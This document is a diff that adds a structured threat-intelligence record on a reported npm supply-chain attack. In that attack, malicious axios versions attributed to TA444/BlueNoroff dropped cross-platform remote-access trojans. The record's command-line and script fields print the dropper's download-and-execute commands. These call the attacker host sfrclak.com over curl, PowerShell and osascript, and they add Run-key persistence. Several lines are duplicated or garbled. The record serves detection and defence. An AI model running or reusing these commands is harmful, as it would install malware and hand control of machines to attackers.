@@ -1,0 +1,154 @@
+title: 'Breaking Down the Axios Attack: Obfuscated Dropper, Cross-Platform RATs, and
+  the TA444/BlueNoroff Connection'
+description: A financially motivated subgroup of the Lazarus collective, TA444/BlueNoroff,
+  compromised npm accounts to deploy platform-specific RATs through malicious versions
+  of the axios package.
+attribution: TA444/BlueNoroff (DPRK)
+malware_families:
+- NukeSped
+- Cross-Platform RAT
+cves: []
+ttps:
+  processes:
+  - powershell.exe
+  - cmd.exe
+  - curl
+  - python3
+  - osascript
+  - zsh
+  - wt.exe
+  - system.bat
+  - cscript.exe
+  command_lines:
+  - node setup.js
+  - copy powershell.exe %PROGRAMDATA%\wt.exe
+  - echo @echo off > %PROGRAMDATA%\system.bat & echo curl -o /tmp/ld.py -d packages.npm.org/product2
+    -s http://sfrclak.com:8000/6202033&& nohup python3 /tmp/ld.py http://sfrclak.com:8000/6202033
+    > /dev/null 2>&1 & >> %PROGRAMDATA%\system.bat
+  - echo @echo off > %PROGRAMDATA%\system.bat & echo curl -o /tmp/ld.py -d packages.npm.org/product2
+    -s http://sfrclak.com:8000/6202033&& nohup python3 /tmp/ld.py http://sfrclak.com:8000/6202033
+    > /dev/null 2>&1 & >> %PROGRAMDATA%\system.bat
+  - echo @echo off > %PROGRAMDATA%\system.bat & echo curl -o /tmp/ld.py -d packages.npm.org/product2
+    -s http://sfrclak.com:8000/6202033&& nohup python3 /tmp/ld.py http://sfrclak.com:8000/6202033
+    > /dev/null 2>&1 & >> %PROGRAMDATA%\system.bat
+  - curl -o /tmp/ld.py -d packages.npm.org/product2 -s http://sfrclak.com:8000/6202033&&
+    nohup python3 /tmp/ld.py http://sfrclak.com:8000/6202033 > /dev/null 2>&1 &
+  - osascript -e 'curl -o /tmp/ld.macho -d packages.npm.org/product0 -s http://sfrclak.com:8000/6202033
+    && chmod 770 /tmp/ld.macho && nohup /bin/zsh -c "/tmp/ld.macho" > /dev/null 2>&1
+    &'
+  - Invoke-WebRequest -Uri http://sfrclak.com:8000/6202033 -Method POST -Body "packages.npm.org/product1"
+    -OutFile %TEMP%\rat.ps1
+  - powershell.exe -w hidden -ep bypass -File %TEMP%\rat.ps1
+  - nohup python3 /tmp/ld.py http://sfrclak.com:8000/6202033 > /dev/null 2>&1 &
+  - start /min powershell -w h -c "& ([scriptblock]::Create([System.Text.Encoding]::UTF8.GetString((Invoke-WebRequest
+    -UseBasicParsing -Uri 'http://sfrclak.com:8000/6202033' -Method POST -Body 'packages.npm.org/productl').Content)))
+    'http://sfrclak.com:8000/6202033'"
+  - cscript "${vbsPath}" //nologo && del "${vbsPath}" /f
+  - nohup osascript "${appleScriptPath}" > /dev/null 2>&1 &
+  powershell:
+  - Invoke-WebRequest -Uri http://sfrclak.com:8000/6202033 -Method POST -Body "packages.npm.org/product1"
+    -OutFile %TEMP%\rat.ps1
+  - powershell.exe -w hidden -ep bypass -File %TEMP%\rat.ps1
+  - node setup.js
+  - python3 /tmp/ld.py http: null
+  - python3 -c "{[Text.Encoding]::UTF8.GetString(...)}"
+  - '& ([scriptblock]::Create([System.Text.Encoding]::UTF8.GetString((Invoke-WebRequest
+    -UseBasicParsing -Uri ''http://sfrclak.com:8000/6202033'' -Method POST -Body ''packages.npm.org/productl'').Content)))
+    ''http://sfrclak.com:8000/6202033'''
+  - Set-Content -Path $batFile -Value $batCont -Encoding ASCII
+  - Set-ItemProperty -Path $batFile -Name Attributes -Value Hidden
+  - Set-ItemProperty -Path $regKey -Name $regName -Value $batFile
+  scripts:
+  - echo @echo off > %PROGRAMDATA%\system.bat & echo curl -o /tmp/ld.py -d packages.npm.org/product2
+    -s http://sfrclak.com:8000/6202033&& nohup python3 /tmp/ld.py http://sfrclak.com:8000/6202033
+    > /dev/null 2>&1 & >> %PROGRAMDATA%\system.bat
+  - echo @echo off > %PROGRAMDATA%\system.bat & echo curl -o /tmp/ld.py -d packages.npm.org/product2
+    -s http://sfrclak.com:8000/6202033&& nohup python3 /tmp/ld.py http://sfrclak.com:8000/6202033
+    > /dev/null 2>&1 & >> %PROGRAMDATA%\system.bat
+  - echo @echo off > %PROGRAMDATA%\system.bat & echo curl -o /tmp/ld.py -d packages.npm.org/product2
+    -s http://sfrclak.com:8000/6202033&& nohup python3 /tmp/ld.py http://sfrclak.com:8000/6202033
+    > /dev/null 2>&1 & >> %PROGRAMDATA%\system.bat
+  - curl -o /tmp/ld.py -d packages.npm.org/product2 -s http://sfrclak.com:8000/6202033&&
+    nohup python3 /tmp/ld.py http://sfrclak.com:8000/6202033 > /dev/null 2>&1 &
+  - osascript -e 'curl -o /tmp/ld.macho -d packages.npm.org/product0 -s http://sfrclak.com:8000/6202033
+    && chmod 770 /tmp/ld.macho && nohup /bin/zsh -c "/tmp/ld.macho" > /dev/null 2>&1
+    &'
+  - Invoke-WebRequest -Uri http://sfrclak.com:8000/6202033 -Method POST -Body "packages.npm.org/product1"
+    -OutFile %TEMP%\rat.ps1
+  - powershell.exe -w hidden -ep bypass -File %TEMP%\rat.ps1
+  - ~Set objShell = CreateObject("WScript.Shell");objShell.Run "cmd.exe /c curl -s
+    -X POST -d ""packages.npm.org/productl"" ""${c2Endpoint}"" > ""${pslPath}"" &
+    ""${renamedPowershell}"" -w hidden -ep bypass -file ""${psiPath}"" ""${c2Endpoint}""
+    & del ""${pslPath}"t /f", 0, False~
+  - ~set {a, s, d} to {"", "${c2Endpoint}", "${persistencePath}"}trydo shell script
+    "curl -o " & d & a & " -d packages.npm.org/producte & " -s " & s & " && chmod
+    770 "&d&" & /bin/zsh -c \\"" & d & " " & s & " &\\" & /dev/nullend trydo shell
+    script "rm -rf ${appleScriptPath}""~
+  - ~set {a, s, d} to {"", "${c2Endpoint}", "/Library/Caches/com.apple.act.mond"}trydo
+    shell script "curl -o " & d & a & " -d packages.npm.org/producte & " -s " & s
+    & " &&chmod 770 " & d & " && /bin/zsh -c \"" & d & " " & s & " &\" & /dev/nullend
+    trydo shell script "rm -rf /tmp/6202033"~
+  - ~Set-Content -Path $batFile -Value $batCont -Encoding ASCII~
+  - ~Set-ItemProperty -Path $batFile -Name Attributes -Value Hidden~
+  - ~Set-ItemProperty -Path $regKey -Name $regName -Value $batFile~
+  registry_keys:
+  - HKCU...\Run\MicrosoftUpdate
+  - HKCU:\Software\Microsoft\Windows\CurrentVersion\Run
+  image_loads: []
+  network_connections:
+  - setup.js -> sfrclak.com[.]8000
+  - curl -> sfrclak.com[.]8000/6202033
+  - powershell.exe -> sfrclak.com[.]8000/6202033
+  - python3 -> sfrclak.com[.]8000/6202033
+  - osascript -> sfrclak.com[.]8000/6202033
+  - wt.exe -> sfrclak[.]com:8000
+  - powershell.exe -> 142.11.206[.]73:8000
+  - python3 -> 142.11.206[.]73:8000
+  - osascript -> 142.11.206[.]73:8000
+  - node setup.js -> sfrclak[.]com:8000
+  - python3 /tmp/ld.py http: -> sfrclak[.]com:8000
+  - powershell.exe -> sfrclak[.]com:8000
+  - cscript.exe -> sfrclak[.]com:8000
+  - osascript -> sfrclak[.]com:8000
+  file_activity:
+  - '%PROGRAMDATA%\wt.exe'
+  - '%TEMP%\6202033.vbs'
+  - /tmp/ld.py
+  - '%PROGRAMDATA%\system.bat'
+  - package.json
+  - package.md
+  - /tmp/.XXXXXX.scpt
+  - /Library/Caches/com.apple.act.mond
+  - ${appleScriptPath}
+  persistence:
+  - Registry Run key (HKCU) pointing to %PROGRAMDATA%\system.bat
+  - Registry Run key "MicrosoftUpdate"
+  - Registry Run key (HKCU) pointing to ${batFile}
+  process_relations: []
+iocs:
+  hashes:
+  - d6f3f62fd3b9f5432f5782b62d8cfd5247d5ee71
+  - 07d889e2dadce6f3910dcbc253317d28ca61c766
+  - 7c29f4cf2ea91ef05018d5aa5399bf23ed3120eb
+  - e10b1fa84f1d6481625f741b69892780140d4e0e7769e7491e5f4d894c2e0e09
+  - 506690fcbd10fbe6f2b85b49a1fffa9d984c376c25ef6b73f764f670e932cab4
+  - 617b67a8e1210e4fc87c92d1d1da45a2f311c08d26e89b12307cf583c900d101
+  - f7d335205b8d7b20208fb3ef93ee6dc817905dc3ae0c10a0b164f4e7d07121cd
+  - fcb81618bb15edfdedfb638b4c08a2af9cac9ecfa551af135a8402bf980375cf
+  ip_addresses:
+  - 142.11.206.73
+  - 142.11.206[.]73
+  - 23.254.167[.]216
+  - 108.174.194[.]44
+  - 108.174.194[.]196
+  domains:
+  - sfrclak[.]com
+  - a0info.v6[.]army
+  urls: []
+authors:
+- Attribution based on multiple converging lines of evidence
+- TA444/BlueNoroff
+- Hunt.io
+reference: https://hunt.io/blog/axios-supply-chain-attack-ta444-bluenoroff
+date_of_publication: April 01, 2026
+file_creation_date: May 01, 2026
